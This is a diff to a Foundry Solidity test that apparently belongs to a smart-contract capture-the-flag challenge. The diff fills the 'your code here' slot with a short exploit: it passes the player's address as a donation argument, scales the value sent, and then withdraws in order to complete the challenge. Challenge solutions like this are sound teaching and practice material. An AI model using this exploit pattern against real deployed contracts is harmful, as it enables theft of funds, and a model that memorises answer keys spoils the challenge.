@@ -25,7 +25,11 @@ contract Challenge5Test is Test {
     function testComplete() external {
         vm.startPrank(player);
 
-        // tu codigo aca
+        uint256 scale = 10**18 * 1 ether;
+        uint256 addressUint = uint256(uint160(player));
+
+        target.donate{value: addressUint / scale}(addressUint);
+        target.withdraw();
 
         assertTrue(target.isComplete(), "Challenge should be complete");
     }
